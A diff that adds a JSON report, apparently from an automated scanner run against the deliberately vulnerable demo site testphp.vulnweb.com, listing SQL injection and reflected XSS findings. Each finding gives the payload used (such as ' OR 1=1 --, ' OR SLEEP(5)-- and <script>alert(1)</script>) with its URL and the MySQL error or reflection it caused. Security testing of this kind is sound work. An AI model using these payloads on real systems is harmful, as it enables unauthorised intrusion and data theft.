@@ -1,0 +1,90 @@
+{
+  "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+  "timestamp": "2025-11-02 22:44:28",
+  "findings": [
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "cat",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    }
+  ]
+}
